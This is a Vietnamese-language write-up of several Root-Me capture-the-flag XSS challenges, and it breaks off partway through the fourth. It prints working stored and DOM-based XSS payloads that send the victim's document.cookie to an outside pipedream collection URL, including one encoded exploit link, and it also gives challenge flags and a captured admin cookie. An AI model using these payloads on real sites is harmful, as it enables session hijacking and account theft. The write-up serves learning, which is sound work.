# Trần Mạnh Huy

* [Chall 1:	XSS - Stored 1](#chall-1-xss---stored-1)
* [Chall 2: XSS - Stored 2](#chall-2-xss---stored-2)
* [Chall 3: XSS DOM Based - Introduction](#chall-3-xss-dom-based---introduction)
* [Chall 4: XSS DOM Based - AngularJS](#chall-4-xss-dom-based---angularjs)
* [Chall 5: XSS DOM Based - Eval](#chall-5-xss-dom-based---eval)
* [Chall 6: XSS - Reflected](#chall-6-xss---reflected)
* [Chall 7: XSS DOM Based - Filters Bypass](#chall-7-xss-dom-based---filters-bypass)
*
*


## Chall 1: Xss - Stored 1

```
Statement
Steal the administrator session cookie and use it to validate this chall.

```

Đây là 1 chall đơn giản về stored xss. Có 2 phần nhập title và message, gửi abcd ở cả 2 rồi check source bên burpsuite.
Có vẻ tiêm được script nên test luôn: <script>alert(1)</script>, và alert được, vậy thì triển tiếp thôi.

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/xss_02.jpg)


Ý tưởng là ta sẽ lưu scipt cướp cookie ở form message và ngồi đợi thằng admin đến đọc cái message đó và bay màu.

Truyền payload vào message để lấy cookie: <script>document.location="https://eo7xxasp6lhfvaj.m.pipedream.net/?c=".cocat(documemt.cookie)</script>

Ở đây dùng đường dẫn trên pipedream kết hợp với concat để nối thực hiện chuỗi, được server trả về kết quả:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/xss_03.jpg)


> Flag: _ga=GA1.1.73691999.1669083110


## Chall 2: XSS - Stored 2

![](https://github.com/manhhuy2002/hello-world/blob/main/xss_rootme/xss2_01.jpg)

Vẫn như bài trước cho ta 2 phần nhập nhưng thêm 1 số tính năng, và giờ title và message đã bị encode html enities nên kh thực hiện xss được ở đây.

Nếu để ý kĩ, mình sẽ thấy giá trị cookie status=invite đang được hiện thị trên page và không bị fitler html entities. Ta có thể tận dụng ở đây để thực hiện xss

#### Payload: Cookie: status="><script>alert(1)</script>

![](https://github.com/manhhuy2002/hello-world/blob/main/xss_rootme/xss2_04.jpg)

Thực hiện alert thành công, tương tự như bài trước ta gửi payload:

> "><script>document.location="https://eo7xxasp6lhfvaj.m.pipedream.net/?c=".concat(document.cookie)</script>

Ta nhận được cookie trả về :

![](https://github.com/manhhuy2002/hello-world/blob/main/xss_rootme/xss2_03.jpg)

Có được cookie rồi ta ném vào ?section=admin để lấy flag

> COOKIE: status=invite;ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F

![](https://github.com/manhhuy2002/hello-world/blob/main/xss_rootme/xss2_04.jpg)

> FLag: E5HKEGyCXQVsYaehaqeJs0AfV

## Chall 3: XSS DOM Based - Introduction

```
Steal the admin’s session cookie.

```
Source:
```
<script>
var random = Math.random() * (99);
var number = '12';
if(random == number) {
    document.getElementById('state').style.color = 'green';
    document.getElementById('state').innerHTML = 'You won this game but you don\'t have the flag ;)';
}
else{
    document.getElementById('state').style.color = 'red';
    document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
}
</script>

```

Ở đây ta đang có param number nhận input đầu vào, mình thử 1 số bất kì, và trang nó render như sau:

![](https://github.com/manhhuy2002/hello-world/blob/main/xss_rootme/xss3_01.jpg)

Đây là 1 chall đơn giản để giới thiệu về dom-based nên không có filter gì cả, ta sẽ chèn script mình vào thông qua cái param number và bởi vì nó là dom nên đoạn mã độc được sẽ được thực thi bởi đoạn Javascript phía client mà không cần server xử lý request:

![](https://github.com/manhhuy2002/hello-world/blob/main/xss_rootme/xss3_02.jpg)

Thực hiện alert được rồi thì tấn công thôi:

>Script: '; document.location="https://eo7xxasp6lhfvaj.m.pipedream.net/?c=".concat(document.cookie) ;//

![](https://github.com/manhhuy2002/hello-world/blob/main/xss_rootme/xss3_03.jpg)

Gửi đường dẫn vào phần contact: http://challenge01.root-me.org/web-client/ch32/index.php?number=123%27%3B+document.location%3D%22https%3A%2F%2Feo7xxasp6lhfvaj.m.pipedream.net%2F%3Fc%3D%22.concat%28document.cookie%29+%3B%2F%2F

Ta được flag trả về:  

![](https://github.com/manhhuy2002/hello-world/blob/main/xss_rootme/xss3_04.jpg)

> flag: rootme{XSS_D0M_BaSed_InTr0}


## Chal 4: XSS 

```
Steal the admin’s session cookie.

```
Đạp vào mắt ta là 2 phần main và contact, 1 cái thì để xss còn cái còn lại là gửi cho con bot rồi. Triển thôi:

![]()

Đầu tiên phải alert được đã, đọc source:

```
   <p id="name_encoded">Result for  abcd:</p>
        <script>
            var name = ' abcd';
            var encoded = '';
            for(let i = 0; i < name.length; i++) {
                encoded += name[i] ^ Math.floor(Math.random() * name.length);
            }
            encoded = Math.abs(encoded ^ Math.floor(Math.random() * name.length));
            document.getElementById('name_encoded').innerText += ' ' + encoded;
        </script>
        
 ```

Cái ta cần bypass ở đây là truyền sao cho vượt qua được giá trị var name, ví dụ thành var name = '' ; alert(1) -- . Nhưng có vẻ ' bị mã hóa rồi 
